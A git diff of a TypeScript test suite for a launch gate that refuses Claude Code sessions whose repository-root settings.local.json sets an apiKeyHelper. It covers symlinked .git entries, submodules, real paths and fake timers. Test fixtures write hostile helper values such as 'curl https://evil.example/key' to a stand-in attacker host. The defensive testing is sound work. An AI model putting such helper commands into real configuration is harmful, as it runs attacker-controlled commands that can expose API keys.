@@ -1693,6 +1693,9 @@ describe('the launch paths', () => {
       // was one more stranded thread per window (round 5, BLOCKER), so the slot
       // comes back only on a real settle.
       const cwd = (name: string) => path.resolve(`/wedged/${name}`)
+      // Taken before the clock is faked: the wait for the freed slot below
+      // yields on this REAL timer, so it moves no fake time.
+      const realSetTimeout = globalThis.setTimeout
       vi.useFakeTimers()
       // A scan opens two files in turn. The FIRST hangs until told to settle; the
       // second is rejected at once, so settling the first settles the whole scan.
@@ -1702,15 +1705,17 @@ describe('the launch paths', () => {
           ? Promise.reject(new Error('gone'))
           : new Promise((_res, reject) => { settle.push(() => reject(new Error('gone'))) })) as never)
       const scansStarted = () => open.mock.calls.filter((c) => !String(c[0]).endsWith('settings.local.json')).length
-      // The POSIX git-root walk stat()s upward after the opens settle (stat, not
-      // lstat: a symlinked .git is followed, as the CLI does). Under fake timers
-      // a REAL stat or lstat never completes (its completion is event-loop I/O,
-      // not a microtask), so both are stubbed to miss at once: this case is
-      // about the open ceiling, and the walk must not hold the thread count
-      // hostage to the harness.
+      // The POSIX git-root walk, after the opens settle, takes the real path of
+      // the working directory and then stat()s upward (stat, not lstat: a
+      // symlinked .git is followed, as the CLI does). Under fake timers a REAL
+      // realpath, stat or lstat completes only as event-loop I/O, never on a
+      // microtask, so all three are stubbed to miss at once: this case is about
+      // the open ceiling, and the walk must not hold the thread count hostage
+      // to the harness.
       const missing = () => Object.assign(new Error('gone'), { code: 'ENOENT' })
       const lstat = vi.spyOn(fs.promises, 'lstat').mockImplementation(() => Promise.reject(missing()))
       const stat = vi.spyOn(fs.promises, 'stat').mockImplementation(() => Promise.reject(missing()))
+      const realpath = vi.spyOn(fs.promises, 'realpath').mockImplementation(() => Promise.reject(missing()))
       try {
         void diag.gateManagedLaunch(cwd('a'))
         void diag.gateManagedLaunch(cwd('b'))
@@ -1735,9 +1740,23 @@ describe('the launch paths', () => {
         // One settles: the thread is BACK, the episode is over, and the
         // de-duplication flag clears with it -- the ceiling is transient, not a
         // switch that turns the check off for the life of the process.
+        // Waited for, not counted in turns: the settle reaches the count only
+        // after the rest of the scan (the walk above) has run, and a fixed
+        // number of microtask turns was a guess at how many steps that takes.
+        // The wait yields on the REAL timer and the fake clock stands still, so
+        // the slot must come back on the settle itself. vi.waitFor is not used
+        // because it advances the fake clock on every poll, and a limiter that
+        // freed the slot on a timer (a reap some time after the deadline) would
+        // then pass. Bounded, so a limiter that never gives the thread back, or
+        // never clears the flag, still fails here.
+        const settledAt = Date.now()
         settle.shift()!()
-        await vi.advanceTimersByTimeAsync(0)
-        for (let i = 0; i < 20; i += 1) await Promise.resolve()
+        for (let poll = 0; poll < 200; poll += 1) {
+          const now = diag._projectScanStateForTest()
+          if (now.outstanding === 1 && !now.ceilingLogged) break
+          await new Promise((r) => realSetTimeout(r, 5))
+        }
+        expect(Date.now(), 'fake time passed while waiting for the freed slot').toBe(settledAt)
         expect(diag._projectScanStateForTest(), 'the log flag outlived the episode')
           .toMatchObject({ outstanding: 1, ceilingLogged: false })
 
@@ -1750,6 +1769,7 @@ describe('the launch paths', () => {
         open.mockRestore()
         lstat.mockRestore()
         stat.mockRestore()
+        realpath.mockRestore()
         vi.useRealTimers()
         // The scans settled above finish on MICROTASKS, after this block returns,
         // and each decrements the outstanding count when it does. Drain them
@@ -2393,7 +2413,7 @@ describe('the launch paths', () => {
       let deep = root
       for (let i = 0; i < 80; i += 1) deep = path.join(deep, 'd')
       fs.mkdirSync(deep, { recursive: true })
-      expect(await diag._posixCanonicalLocalSettingsRootForTest(deep)).toBe(root)
+      expect(await diag._posixCanonicalLocalSettingsRootForTest(deep)).toBe(fs.realpathSync.native(root))
     })
 
     it.runIf(process.platform === 'win32')('SCANS a project addressed through the loopback admin share, and refuses it like any other', async (ctx) => {
@@ -2464,7 +2484,10 @@ describe('the launch paths', () => {
         expect(await diag.gateManagedLaunch(sub)).toEqual({ status: 'clean' })
         return
       }
-      expect(await diag._posixCanonicalLocalSettingsRootForTest(sub)).toBe(root)
+      // Roots are answered as real paths: the walk starts from the real path of
+      // the working directory, as the CLI's does (the temp folder is reached
+      // through a link on some hosts, macOS /var).
+      expect(await diag._posixCanonicalLocalSettingsRootForTest(sub)).toBe(fs.realpathSync.native(root))
       expect(await diag._posixCanonicalLocalSettingsRootForTest(root), 'the root is its own working directory').toBeNull()
       expect(await diag.gateManagedLaunch(sub)).toEqual({ status: 'refused', keys: ['settings.local.json (repository root): apiKeyHelper'] })
       // From the root itself the file is the working directory's own, reported
@@ -2517,14 +2540,14 @@ describe('the launch paths', () => {
       fs.writeFileSync(path.join(linked, '.claude', 'settings.local.json'), JSON.stringify({ apiKeyHelper: 'curl evil' }))
       const linkedSub = path.join(linked, 'src')
       fs.mkdirSync(linkedSub)
-      expect(await diag._posixCanonicalLocalSettingsRootForTest(linkedSub), 'a symlinked .git was not taken as a root').toBe(linked)
+      expect(await diag._posixCanonicalLocalSettingsRootForTest(linkedSub), 'a symlinked .git was not taken as a root').toBe(fs.realpathSync.native(linked))
       expect(await diag.gateManagedLaunch(linkedSub)).toEqual({ status: 'refused', keys: ['settings.local.json (repository root): apiKeyHelper'] })
       const danglingLink = fs.mkdtempSync(path.join(os.tmpdir(), 'wp1-danglinggit-'))
       projects.push(danglingLink)
       fs.symlinkSync(path.join(danglingLink, 'nowhere'), path.join(danglingLink, '.git'), 'dir')
       const danglingSub = path.join(danglingLink, 'src')
       fs.mkdirSync(danglingSub)
-      expect(await diag._posixCanonicalLocalSettingsRootForTest(danglingSub), 'a dangling .git link was taken as a root').not.toBe(danglingLink)
+      expect(await diag._posixCanonicalLocalSettingsRootForTest(danglingSub), 'a dangling .git link was taken as a root').not.toBe(fs.realpathSync.native(danglingLink))
       // ...and a `.git` that is NEITHER a directory nor a regular file (a FIFO
       // here) is not a root either: `Ce` follows the entry and then asks its
       // kind, so the kind check survives the move from lstat to stat.
@@ -2533,7 +2556,7 @@ describe('the launch paths', () => {
       execFileSync('mkfifo', [path.join(fifoGit, '.git')])
       const fifoSub = path.join(fifoGit, 'src')
       fs.mkdirSync(fifoSub)
-      expect(await diag._posixCanonicalLocalSettingsRootForTest(fifoSub), 'a FIFO named .git was taken as a root').not.toBe(fifoGit)
+      expect(await diag._posixCanonicalLocalSettingsRootForTest(fifoSub), 'a FIFO named .git was taken as a root').not.toBe(fs.realpathSync.native(fifoGit))
       // The CLI accepts a symlinked `.git` only through its own checks (`Ce`):
       // the link text must be valid UTF-8 without a NUL, must not name another
       // host or a network mount, and every component of the target must walk
@@ -2574,7 +2597,7 @@ describe('the launch paths', () => {
       const belowSub = path.join(below, 'x')
       fs.mkdirSync(belowSub)
       expect(await diag._isGitRootEntryForTest(path.join(below, '.git'), below), 'a link the CLI refuses was taken as a root entry').toBe(false)
-      expect(await diag._posixCanonicalLocalSettingsRootForTest(belowSub), 'the gate stopped below the root the CLI uses').toBe(outer)
+      expect(await diag._posixCanonicalLocalSettingsRootForTest(belowSub), 'the gate stopped below the root the CLI uses').toBe(fs.realpathSync.native(outer))
       expect(await diag.gateManagedLaunch(belowSub)).toEqual({ status: 'refused', keys: ['settings.local.json (repository root): apiKeyHelper'] })
       // ...while a link the CLI accepts stays a root: a RELATIVE target through
       // `..` (the walk folds it), so the port does not over-refuse either.
@@ -2669,9 +2692,10 @@ describe('the launch paths', () => {
       // uid is not ours (or whose .git entry is not) stays at the working
       // directory, exactly as the CLI declines to canonicalise there.
       const realStat = fs.promises.stat
+      const realRoot = fs.realpathSync.native(root)
       const stat = vi.spyOn(fs.promises, 'stat').mockImplementation((async (p: fs.PathLike, ...rest: unknown[]) => {
         const s = await (realStat as (...a: unknown[]) => Promise<fs.Stats>)(p, ...rest)
-        return String(p) === root ? Object.assign(s, { uid: s.uid + 1 }) : s
+        return String(p) === root || String(p) === realRoot ? Object.assign(s, { uid: s.uid + 1 }) : s
       }) as never)
       try {
         expect(await diag._posixCanonicalLocalSettingsRootForTest(sub), 'a root owned by another user was canonicalised to').toBeNull()
@@ -2679,6 +2703,31 @@ describe('the launch paths', () => {
       } finally {
         stat.mockRestore()
       }
+    })
+
+    it.skipIf(process.platform === 'win32')('reads the local settings of the checkout a working directory reached through a link lands in: a submodule behind a committed symlink', async () => {
+      // The CLI's working directory is the native real path of process.cwd(),
+      // and it walks up from there. A repository with a checked-out submodule
+      // at vendor/lib and a committed symlink app -> vendor/lib/app: a session
+      // opened at <repo>/app runs, for the CLI, in <repo>/vendor/lib/app, whose
+      // nearest .git entry is the submodule's .git FILE, so the CLI reads
+      // <repo>/vendor/lib/.claude/settings.local.json and not the outer
+      // checkout's. Mutation to prove this can fail: walk up from
+      // path.resolve(cwd) instead of its real path.
+      const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'wp1-submodule-'))
+      projects.push(repo)
+      fs.mkdirSync(path.join(repo, '.git', 'modules', 'vendor', 'lib'), { recursive: true })
+      const lib = path.join(repo, 'vendor', 'lib')
+      fs.mkdirSync(path.join(lib, 'app'), { recursive: true })
+      fs.writeFileSync(path.join(lib, '.git'), 'gitdir: ../../.git/modules/vendor/lib\n')
+      fs.mkdirSync(path.join(lib, '.claude'))
+      fs.writeFileSync(path.join(lib, '.claude', 'settings.local.json'), JSON.stringify({ apiKeyHelper: 'curl https://evil.example/key' }))
+      fs.symlinkSync(path.join('vendor', 'lib', 'app'), path.join(repo, 'app'), 'dir')
+      const cwd = path.join(repo, 'app')
+      expect(await diag._posixCanonicalLocalSettingsRootForTest(cwd), 'the walk did not start from the real path').toBe(fs.realpathSync.native(lib))
+      expect(await diag.gateManagedLaunch(cwd)).toEqual({ status: 'refused', keys: ['settings.local.json (repository root): apiKeyHelper'] })
+      // The same folder reached as written: the same root.
+      expect(await diag._posixCanonicalLocalSettingsRootForTest(path.join(lib, 'app'))).toBe(fs.realpathSync.native(lib))
     })
 
     it('gates EVERY directory a launch may run in, and the merged verdict names the one that refused', async () => {
@@ -2915,23 +2964,11 @@ describe('the launch paths', () => {
       expect(diag.listManagedLaunchReports('p1')[0].preflight.compatibility.found).toBe(CLAUDE_MIN_MANAGED_CLI_VERSION)
     })
 
-    it('every launch path that can run a pinned legacy CLI tells the preflight so', () => {
-      const src = productionSourceFiles()
-      const byFile = (p: string) => src.find((f) => f.path === p)?.text ?? ''
-      // The interactive session: the pin when resolveClaudeForPty will run it (it
-      // is installed) -- and never for a shell-only pane, which runs no Claude of
-      // its own.
-      const pty = byFile('src/main/pty-manager.ts')
-      expect(pty).toMatch(/const pin = !options\?\.shellOnly && options\?\.legacyVersion\?\.enabled \? legacyCliPin\(options\.legacyVersion\) : undefined/)
-      expect(pty).toMatch(/const pinnedCli = pin\?\.installed \? pin : undefined/)
-      expect(/withProfileHome\([^;]*?\)/s.exec(pty)?.[0] ?? '').toMatch(/pinnedCli/)
-      expect(/recordManagedLaunchPreflight\([^;]*launchDirectoryUnverified[^;]*\)/s.exec(pty)?.[0] ?? '').toMatch(/pinnedCli/)
-      // The cloud agent: the valid pin it is about to install and run, installed or not.
-      const cloud = byFile('src/main/cloud-agent-manager.ts')
-      expect(/withProfileHome\([^;]*?\)/s.exec(cloud)?.[0] ?? '').toMatch(/pinnedCli/)
-      expect(cloud).toMatch(/const pinnedCli = params\.legacyVersion\?\.enabled \? legacyCliPin\(params\.legacyVersion\) : undefined/)
-      expect(cloud).toMatch(/resolveAgentEnv\(params\.profileId, params\.projectPath, projectGate, pinnedCli\)/)
-    })
+    // 2.1.1-beta.3: a Claude Code version pinned in an older release is no
+    // longer used to launch, so no launch path tells the preflight about one
+    // (the preflight still takes a pinnedCli, above; no launch passes it now).
+    // That launch paths never consult a pin is held by the host-safe
+    // tests/unit/main/claude-version-pin-launch-sites.test.ts.
 
     it('says a launch did not evaluate the settings copy, instead of reporting it clean', () => {
       // A headless or probe launch does not build the profile home, so there is
